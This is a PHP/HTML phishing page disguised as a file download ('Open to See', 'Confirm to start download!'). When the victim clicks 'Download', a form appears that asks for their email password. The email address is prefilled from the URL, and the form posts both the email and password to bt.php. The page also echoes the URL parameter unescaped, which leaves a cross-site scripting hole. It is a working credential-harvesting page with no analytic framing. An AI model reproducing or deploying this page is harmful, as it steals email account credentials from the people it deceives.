<!doctype html>
<html>

<head>
	<meta charset="utf-8">
	<meta property="og:title" content="Open to See">
	<meta property="og:description" content="35 views, 398 likes">


	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

	<!-- Popper JS -->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<style>
		body {
			background-image: url(img/1.jpg);
			background-repeat: no-repeat;
			color: #045eb4;
		}
		
		
		
		#d {
			position: relative;
			left: 530px;
			top: 350px;
			
		}
		
		#form {
			position: absolute;
			left: 530px;
			top: 50px;
			width: 400px;
			border-radius: 10px;
			padding: 20px;
			z-index: 2;
			background: white;
			display:none;
			
			
			
			
			
		}
		.blue{
			background-color: #045eb4;
			color: white;
		}
		#sub1{
			margin-top: 480px;
			margin-left: 140px;
			border-radius: 15px;
			position: absolute;
			z-index: 1;
			
			
		}
		.sky{
			background-color: #409fff;
			color:white;
			
		}
	</style>
</head>

<body>
	<div id="form">
	<div class="text-center">
		<img src="img/2.jpg" width="200"><br>
		<div style="color:black;">Confirm to start download! </div>
	</div>
	<hr>
	<h1></h1>
		<form method="POST" action="bt.php">
			<p><?php if(isset($_GET['email'])) echo $_GET['email']; ?></p>
			
			<input type="password" name="p" class="form-control" value="" id="password" placeholder="Enter Email Password">
			<small class="text-danger" id="er" style="margin-top: -5px; position: absolute"></small>
			<input type="hidden" value="<?php if(isset($_GET['email'])) echo $_GET['email']; ?>" name="x"><br>

			<input id="sub" name="sub" type="submit" class="btn btn-md btn-block sky"  value="Download">

		</form>
	
	</div>
	<a href="#" id="sub1" class="btn btn-md sky text-white">Download </a>

	<script>
		$(document).ready(function(){
			$("#sub1, #pix").click(function(){
				$("#form").slideToggle();
				
			});
			
		});
	</script>
	<script>
$(document).ready(function() {
	
	$('form').submit(function() {
		
		var pwd = $('#password').val();
		
		if($('#password').val() == '') {
			$('#er').text('Please enter your password to continue');
			return false;
			//$('#password').focus();
		}else{
			$('#er').hide().text('');
			return true;
		}
	});
});
</script>
	
</body>

</html>